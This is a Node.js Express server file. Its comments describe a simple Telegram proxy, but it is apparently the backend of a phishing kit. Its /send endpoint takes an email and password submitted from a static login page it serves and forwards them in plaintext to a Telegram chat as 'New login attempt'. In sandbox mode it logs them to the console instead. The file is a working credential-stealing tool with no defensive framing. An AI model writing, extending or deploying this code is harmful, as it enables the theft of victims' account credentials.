// Minimal Express proxy that accepts POST /send and forwards message to Telegram Bot API
// Usage: create a .env file with BOT_TOKEN and CHAT_ID, then `npm install` and `npm start`

require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
// log incoming requests for debugging
app.use((req, res, next) => {
  console.log(new Date().toISOString(), req.method, req.url);
  next();
});
app.use(express.static(__dirname)); // serve static files (index.html, app.js, style.css)

// respond to preflight OPTIONS for /send to avoid Method Not Allowed in some clients
app.options('/send', (req, res) => {
  res.set({ 'Access-Control-Allow-Methods': 'POST, OPTIONS', 'Access-Control-Allow-Headers': 'Content-Type' });
  return res.sendStatus(204);
});

// basic rate limiter for the /send endpoint
const limiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 15, // limit each IP to 15 requests per windowMs
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/send', limiter, async (req, res) => {
  const { email, password } = req.body || {};
  if (!email || !password) return res.status(400).json({ ok: false, error: 'missing fields' });

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  const SANDBOX = process.env.SANDBOX === 'true';

  // If sandbox mode is enabled or BOT_TOKEN is missing, do not send to Telegram.
  if (SANDBOX || !BOT_TOKEN) {
    console.log('SANDBOX MODE - message payload:', { email, password, chat_id: CHAT_ID });
    return res.json({ ok: true, sandbox: true, payload: { email, password, chat_id: CHAT_ID } });
  }

  if (!CHAT_ID) return res.status(500).json({ ok: false, error: 'CHAT_ID not set on server' });

  const text = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
    const json = await resp.json();
    if (!json.ok) return res.status(500).json({ ok: false, error: JSON.stringify(json) });
    return res.json({ ok: true, result: json.result });
  } catch (err) {
    console.error('Telegram send error', err);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
